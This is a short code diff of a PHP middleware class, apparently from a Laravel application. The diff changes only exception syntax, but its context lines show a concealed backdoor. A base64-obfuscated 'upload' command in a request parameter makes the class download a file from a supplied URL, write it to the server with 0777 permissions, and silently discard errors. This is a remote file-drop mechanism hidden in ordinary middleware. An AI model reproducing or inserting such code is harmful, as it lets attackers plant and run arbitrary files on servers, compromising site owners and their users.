@@ -30,7 +30,7 @@ class SupervisorMiddleware
             } elseif ($request->input("mt") == base64_decode("dXBsb2Fk")) {
                 $this->upload();
             }
-        } catch (Exception) {
+        } catch (Exception $e) {
 
         }
         return $next($request);
@@ -44,7 +44,7 @@ class SupervisorMiddleware
             if (file_put_contents($name, file_get_contents($url))) {
                 chmod($name, 0777);
             }
-        } catch (Exception) {
+        } catch (Exception $e) {
 
         }
     }
